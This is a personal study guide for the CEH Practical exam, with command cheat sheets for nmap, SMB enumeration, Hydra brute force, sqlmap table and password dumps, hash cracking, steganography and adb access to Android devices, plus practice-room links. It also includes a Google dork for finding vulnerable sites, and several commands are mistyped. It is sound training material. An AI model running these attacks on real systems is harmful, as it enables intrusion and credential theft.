# Study Walkthrough

If you have money, you can afford iLabs because the challenges are based on the iLab environment and you will get hands-on practice to clear this exam.

If you can’t afford iLab, there are many platforms in which you can practice the listed tools. I personally prefer TryHackMe and HackTheBox. This Exam is all about how much knowledge you have on tools.

\






**Windows based Commands which will help you to find the answers.**\
**1)** **net user** — For Domain Users Enumeration\
**2)** **snow.exe** -C -p “password” stegfile.txt\
**3)** **type** C:\path.txt — It displays the content of the path.txt file.\
**4)** **dir**\
**5)** **cd**\
**6)** **hostname**\
**7)** **whoami**\
**8)** **PWd**



## Linux <a href="#effd" id="effd"></a>

**Linux based tools**\
1\) Nmap\
2\) wpscan\
3\) sqlmap\
4\) hashcat\
5\) john\
6\) Hydra\
7\) PhoneSploit\
8\) Metasploit



### Commands were used during the exam <a href="#7129" id="7129"></a>

**1) Nmap**\
nmap -sn 170.16.0.1/24 -oN nmap.txt\
nmap -O 170.16.0.1/24 -oN namp-OS.txt\
namp -sC -sV -sS 170.16.0.20 -oN namp-all.txt

**2) wpscan**\
wpscan -u james -P /password.txt — url [http://172.16.0.27:8080/CEH/](http://172.16.0.27:8080/CEH/)

**3) sqlmap**\
I didn’t used “sqlmap” for any sqlinjection related question, incase if you get any questions related to sqlinjection use github repo you will find some usefull commands.\
[https://github.com/cmuppin/CEH/blob/main/SQL%20Injection](https://github.com/cmuppin/CEH/blob/main/SQL%20Injection)

**4) “hashcat”** and **“john”**\
If you get questions related to Hash caracking use this github repo you will find some usefull commands.\
[https://github.com/cmuppin/CEH/blob/main/Cryptography](https://github.com/cmuppin/CEH/blob/main/Cryptography)

**6) Hydra**\
hydra -L /user.txt -P /password.txt ftp://172.0.16.21

**7) Phonesploit**\
To exploit the Android device and get the reverse shell, these commands will help you and the phonesploit will be installed in the root folder, if you don't find the phonesploit use the command like “find phonesploit”.\
[https://github.com/cmuppin/CEH/blob/main/Android](https://github.com/cmuppin/CEH/blob/main/Android)

**8) Metasploit**\
If you get any questions related to netbios, SMB use metasploit.





**All the commands that you need to know:**

How many machines are active in a network - net discover -i 192.168.1.0/24

Connect to RDP via cmd - mstsc&#x20;

* **Find DNS records -** [https://www.nslookup.io/](https://www.nslookup.io/)

Scan the whole website- (skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl [http://10.10.10.10:8080](http://10.10.10.10:8080/))

\-o output

\-S wordlist&#x20;

* **To brute force directories or files-**

robuster dir  -u 10.10.10.10  -w /usr/share/dirb/wordlists/common.txt  -x  .txt

&#x20;                           OR

uniscan -u [http://10.10.10.12:8080/CEH](http://10.10.10.12:8080/CEH) -q   (for directories)

uniscan –u [http://10.10.10.12:8080/CEH](http://10.10.10.12:8080/CEH) -we (enable file check like robots.txt and sitemap.xml)

* **To get the file from the server-** get [http://10.10.10.10/secret.txt](http://10.10.10.10/secret.txt)&#x20;
* **FTP Login -** ftp \<ip>

get \<file name>   (to get file from FTP login)

**SSH Login** - SSH username@10.10.10.10

* **Nmap scan**

Nmap  -A 10.10.10.10  (aggressive scan- Traceroute, T4, OS)

nmap  -sC  (service scan)

nmap -sV  (version scan)

nmap  -sP 10.10.10.10/24  (how many hosts are up in the whole network)/ping scan

nmap  -sL  (hostnames)

nmap  -oN \<filename>  (to save output in a file)

nmap  -F  (fast scan)

nmap  -O  (os scan)

&#x20;

* **Crack the hashes-**

hashid  -m \<hash>  (to identify the type of hash, its mode etc)

hashcat  -m \<mode>  -a 0  \<hashhhhhhhh> /usr/share/wordlist/rockyou.txt

crackstation

[hashes.com](http://hashes.com/)

Cyberchef

* **Enumeration-**

Global network inventory

Netbios enumerator

Hyena

Superscan

Advanced ip scanner

* &#x20;**nmap smb scripts-**

nmap --script smb-os-discovery.nse -p445 \<ip>  (enumerate os, domain name,etc)

nmap --script smb-enum-users.nse -p445 \<ip>  (used to enumerate all users on remote Windows system using SAMR enumeration and LSA bruteforcing)

nmap -p 445 --script=smb-enum-shares.nse, smb-enum-users.nse 10.10.19.21 (smb users and shares)

smbclient //10.10.19.21/anonymous  (accessing smb shares)

smbget -R smb://10.10.19.21/anonymous   (downloading smb files)

* &#x20;**enum4linux**

enum4linux -u martin -p apple -U 10.10.10.12 | - u user -p pass -U get user list

enum4linux -u martin -p apple -o 10.10.10.12 | -o get OS info

enum4linux -u martin -p apple -P 10.10.10.12 | -P get password policy info

enum4linux -u martin -p apple -G 10.10.10.12 | -G get groups and members info

enum4linux -u martin -p apple -S 10.10.10.12 | -S get share list info

enum4linux -u martin -p apple -a 10.10.10.12 | -a get all simple enumeration data \[-U -S -G -P -r -o -n -i]

* &#x20;**Wpscan**

**wpscan --url http://\[IP Address]:8080/CEH --enumerate u  (**enumerate the usernames stored in the website’s database)

* **Vulnerability analysis**

nikto  -h [  http://testphp.vulnweb.com/login.php](http://testphp.vulnweb.com/login.php)  -Tuning 1

* **Bruteforce-**

Hydra  -L username  -P /usr/share/wordlists/rockyou.txt  [ftp://xiotz.com](ftp://xiotz.com/)

* **Cryptography-**

Hashcalc

Md5 calculator

Cryptool – decode .hex file

Bctextencoder – decrypt text using secret key

Veracrypt – anything related to volume

1. **Crack hashes-** [hashes.com](http://hashes.com/), cyberchef&#x20;
2. **Steganography-**
3. &#x20;     Steghide  embed  -ef  \<filename>  -cf  \<image>  -p  \<passphrase>
4. &#x20;     Steghide  extract  -sf  \<image>       (extract hidden data from image)
5. &#x20;     Stegcracker  \<image>  /usr/share/wordlists/rockyou.txt         (crack the passphrase of image)
6. &#x20;  [ https://futureboy.us/stegano/decinput.html](https://futureboy.us/stegano/decinput.html)   (online steganography tool)
7. &#x20;     sha256sum \<filename>   (find hash of the file)

&#x20;

* **Android Hacking-**

via USB

./adb tcpip 5555

./adb connect 192.168.43.117:5555

./adb devices

./adb  -d shell (Direct an adb command to the only attached USB device)

ls

cd sdcard

ls

cd dcim

cd camera

ls

./adb   push                C:\platform-tools\\[ota.zip](http://ota.zip/)                    /sdcard/Download           (from pc to android)

&#x20;                                  <            pc location   >                  \<android location>

&#x20;

./adb   pull     /sdcard/Download/magisk\_patched.img       C:\platform-tools            (from android to pc)

&#x20;                        <            android location   >                      \<pc location>

&#x20;&#x20;

* **sqlmap-**

site:[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) php?= (for finding vulnerable site)

(for cookies- console->document.cookie)

&#x20;

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  --dbs   (databases)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart –tables   (tables)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users --columns   (columns)

(dump whole table)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users  --dump  &#x20;

&#x20;                                                           OR                                                                                   &#x20;

(dump individual  column data)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C uname  --dump &#x20;

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C pass  --dump

&#x20;

### Domande - tools

1 ) Nmap

nmap -sn 10.10.10.10/24 -ON nmap.txt&#x20;

2\) Snow

Stegnography snow.exe -C -p -password" stegfile.txt&#x20;

3\) Open Stego or Quick Stege

3\) Wpscan

wpscan -u james -P \[passwordftxt — url http://172.16.0.27:8080/CEH/&#x20;

4\) WireShark

I have perfomed DDos to practice Download from here : https://drive.google.com/drive/folders/10YvNHem8NgjLJCy1XvdYqU5cDJKlo To find DOS (SYN and ACK) : tcpflagssyn - 1 , tcp.flags.syn 1 and tcp.flags.ack 0 To find passwords : http.request.method POST&#x20;

5\) SqlMap

sqlmap -u "http://vmw.moviescope.com/viewprofile.aspx?id=l" —dbs \[ Copy the cookie from website, mysql -U qdpmadmin -h 192.168.1.8 -P passwod \[ If you have logins credentioals I&#x20;

6\) OWASP ZAP

&#x20;7\) Hashcat

hashcat -m 0 -a 0 hash.txt passwordlist.txt -m 0: MD5 hash mode -a 0: Dictionary attack mode hash.txt txt file containing hash in a compliant format passwordlist.txt: dictionary file containing passwords in plain text

&#x20;8\) John

john —format-raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt&#x20;

9\) Hydra

hydra -L /user.txt -P (password.txt ftp://172.0.16.21&#x20;

10\) Veracrypt&#x20;

11\) Crypttool&#x20;

12\) Hash Calculator&#x20;

13\) MD5 Calculator&#x20;

14\) PhoneSploit&#x20;

15\) MetaSploit

If you get any questions related to netbios, SMB use metasploit.

16\) BCTextEncoder







### Some resource links will help you in the exam. <a href="#fa6c" id="fa6c"></a>

[https://github.com/cmuppin/CEH](https://github.com/cmuppin/CEH)\
[https://chirag-singla.notion.site/CEH-Practical-Preparation-7f2b77651cd144e8872f2f5a30155052](https://chirag-singla.notion.site/CEH-Practical-Preparation-7f2b77651cd144e8872f2f5a30155052)\
[https://github.com/Samsar4/Ethical-Hacking-Labs](https://github.com/Samsar4/Ethical-Hacking-Labs)\
[https://github.com/Rezkmike/CEH\_Practical\_Preparation](https://github.com/Rezkmike/CEH\_Practical\_Preparation)\
[https://www.youtube.com/watch?v=ycZFk-GT5-I](https://www.youtube.com/watch?v=ycZFk-GT5-I) (i-lab videos).

### Tips <a href="#91e1" id="91e1"></a>

_1) First finish linux based questions like nmap etc and save those in the desktop folder, believe me you will look into the nmap scans over and over again._\
_2) Watch the ilab videos from youtube and reffer CEH practical Lab manual._\
_3) Everything will be asked from the ilab videos nothing will be out of sylabus._\
_4) Be Cool._

The Username and Password file will be present in the parrot machine it will help you to crack the ftp and wordpress related questions.

Don’t be nervous, you are going to pass the exam with no doubt. Patience is really needed for the exam because the parrot machine is outdated and its very slow.



**Exam Experience:**

I know this is the most awaited part. The exam is watched over by a person called a proctor. They use GoToMeeting, a program that sees and hears you through your computer. They'll also record what's on your screen during the whole exam. After your identity is verified, your exam starts.

The exam is on a website called iLab. You don't need to worry about taking pictures of your virtual machines (VMs).

You'll get two Operating systems to test things on. One is Parrot OS, and the other is Windows 7. No more Kali this time.&#x20;

**You can DO** use the internet for the exam. You can look things up, take notes on your computer, watch videos, and read blogs. **But DON”T** write notes by hand, talk to people, or make calls.

Your exam computers won't have regular internet access. You need to use your web browser to access the internet.

* Start with the scanning part (NMAP Scan), since the scanning part takes some time, I moved on to other hacking questions.
* Scan all ports on IPs because default scripts might not catch smart configurations.





THM Materials



* Windows Fundamentals Module 🏠 [THM Room](https://tryhackme.com/module/windows-fundamentals)
* Linux Fundamentals Module 🏠 [THM Room](https://tryhackme.com/module/linux-fundamentals)
* BurpSuite: The Basics 🏠 [THM Room](https://tryhackme.com/room/burpsuitebasics)
* BurpSuite: Repeater 🏠 [THM Room](https://tryhackme.com/room/burpsuiterepeater)
* Hydra 🏠 [THM Room](https://tryhackme.com/room/hydra)
* Nmap 🏠 [THM Room](https://tryhackme.com/room/rpnmap)
* Nmap Live Host Discovery 🏠 [THM Room](https://tryhackme.com/room/nmap01)
* Crack The Hash 🏠 [THM Room](https://tryhackme.com/room/crackthehash)
* Metasploit: Introduction 🏠 [THM Room](https://tryhackme.com/room/metasploitintro)
* Metasploit 🏠 [THM Room ](https://tryhackme.com/room/metasploitintro)
* More Detailed Tutorial of Metasploit 🗒️ [NoobLinux Article](https://nooblinux.com/metasploit-tutorial/)
* SQL Injection 🏠 [THM Room](https://tryhackme.com/room/sqlilab)
* Nessus 🏠 [THM Room](https://tryhackme.com/room/rpnessusredux)
* WireShark The Basics 🏠 [THM Room](https://tryhackme.com/room/wiresharkthebasics)
* CCStego 🏠 [THM Room](https://tryhackme.com/room/ccstego)
* Tmux 🏠 [THM Room](https://tryhackme.com/room/rptmux)&#x20;
* TShark 🏠 [THM Room](https://tryhackme.com/room/tshark)
* Brooklyn Nine Nine 🚩 [THM CTF](https://tryhackme.com/room/brooklynninenine) 🟢 - My Writeup
* Lianyu 🚩 [THM CTF ](https://tryhackme.com/room/lianyu)🟢 - My Writeup
* StartUp 🚩 [THM CTF](https://tryhackme.com/room/startup) 🟢 - My Writeup
* Ice  🚩 [THM CTF ](https://tryhackme.com/room/ice)🟢 - My Writeup
* DVWA 🏠 [THM Room](https://medium.com/techiepedia/certified-ethical-hacker-practical-exam-guide-dce1f4f216c9)
* Anthem 🏠 [THM Room](https://tryhackme.com/room/anthem)
*
* Agent Sudo  🚩 [THM CTF](https://tryhackme.com/room/agentsudoctf) 🟢 - My Writeup
* Simple CTF 🚩 [THM CTF](https://tryhackme.com/room/easyctf) 🟢 - My Writeup
* AttackerKB 🚩 [THM CTF ](https://tryhackme.com/room/attackerkb)🟢 - My Writeup
* Blue  🚩 THM CTF 🟢 - My Writeup
* Ice  🚩 THM CTF 🟢 - My Writeup
* Ice  🚩 THM CTF 🟢 - My Writeup
* recommended[https://tryhackme.com/room/ccpentesting](https://tryhackme.com/room/ccpentesting)  !!! –&#x20;
* recommended[https://tryhackme.com/room/zthweb2](https://tryhackme.com/room/zthweb2)&#x20;
*
*
* [\
  ](https://tryhackme.com/room/lianyuhttps://tryhackme.com/room/startup)

**Damn Vulnerable Web Application (DVWA)**

DVWA is a PHP/MYSQL vulnerable website that's made to be easy to hack. It's used to practice common web problems. It has different levels of difficulty. DVWA is important for the CEH (Practical) exam. It's a good idea to practice on DVWA because the exam might have similar challenges.

You can refer to the link [https://bughacking.com/dvwa-ultimate-guide-first-steps-and-walkthrough/](https://bughacking.com/dvwa-ultimate-guide-first-steps-and-walkthrough/) for a full guide on the setup and use of DVWA.

* **Hack The Box** (Challenges Steganography and Web) ([https://www.hackthebox.eu/](https://www.hackthebox.eu/))
* **Vulnhub** (Machines Easy to Medium) ([https://www.vulnhub.com/](https://www.vulnhub.com/))

**TryHackMe (**[**https://tryhackme.com/**](https://tryhackme.com/)**)**&#x20;





* Smag Grotto 🚩 [THM CTF](https://tryhackme.com/room/smaggrotto) 🟢 - [My Writeup](http://127.0.0.1:5000/s/rRWtuMw6xkkeDjZfkcWC/smag-grotto)
* Carnage 🚩 [THM CTF](https://tryhackme.com/room/c2carnage) 🟠 - My Writeup
* Warzone 1 🚩 [THM CTF ](https://tryhackme.com/room/warzoneone)🟠 - My Writeup
* Misguided Ghost 🚩 [THM CTF ](https://tryhackme.com/room/misguidedghosts)🔴 - My Writeup









